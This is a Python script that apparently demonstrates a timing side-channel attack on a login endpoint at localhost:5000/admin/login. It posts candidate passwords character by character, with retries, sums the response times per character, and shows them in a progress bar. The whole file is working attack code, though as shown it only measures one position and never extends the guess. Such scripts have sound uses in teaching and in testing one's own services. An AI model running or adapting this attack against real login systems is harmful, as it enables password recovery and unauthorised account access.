import time
import requests
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

from tqdm import tqdm, trange

DEFAULT_CHARSET = "abc"  # "abcdefghijklmnopqrstuvwxyz"


s = requests.Session()
retries = Retry(total=100,
                backoff_factor=0.1,
                status_forcelist=[500, 502, 503, 504])
s.mount('http://', HTTPAdapter(max_retries=retries))


def send_request(password):
    start_time = time.time()
    req = s.post("http://localhost:5000/admin/login",
                 json={"password": password})
    return req.text, time.time() - start_time


def attack(password="", charset=DEFAULT_CHARSET, iterations=100_000):
    chars = {}
    charset = [c for c in charset]
    for c in charset:
        chars[c] = 0
    with tqdm(range(iterations)) as pbar:
        for i in pbar:

            pbar.set_description(
                ' '.join(
                    ["{}:{:.8f}".format(c, chars[c] / (i+1))
                     for c in chars.keys()])
            )
            for c in charset:
                res, time = send_request(password + c)
                chars[c] += time


if __name__ == "__main__":
    attack()
